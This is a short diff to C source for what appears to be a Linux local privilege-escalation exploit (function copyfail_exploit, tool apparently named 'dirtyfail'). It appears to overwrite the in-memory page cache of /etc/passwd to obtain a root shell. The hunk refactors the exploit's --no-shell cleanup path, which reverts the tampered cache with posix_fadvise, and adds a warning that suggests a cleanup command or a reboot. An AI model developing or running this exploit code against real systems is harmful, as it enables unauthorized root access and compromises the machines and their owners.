@@ -429,14 +429,11 @@ df_result_t copyfail_exploit(bool do_shell)
     if (p) log_step("getpwnam('%s').pw_uid = %u", user, p->pw_uid);
 
     if (!do_shell) {
-        log_hint("--no-shell selected; reverting page cache via POSIX_FADV_DONTNEED");
-        int e = open("/etc/passwd", O_RDONLY);
-        if (e >= 0) {
-#ifdef POSIX_FADV_DONTNEED
-            posix_fadvise(e, 0, 0, POSIX_FADV_DONTNEED);
-#endif
-            close(e);
-        }
+        log_hint("--no-shell selected; reverting page cache");
+        if (try_revert_passwd_page_cache())
+            log_ok("page cache reverted");
+        else
+            log_warn("page cache may still be modified — `sudo dirtyfail --cleanup` or reboot");
         return DF_EXPLOIT_OK;
     }
 
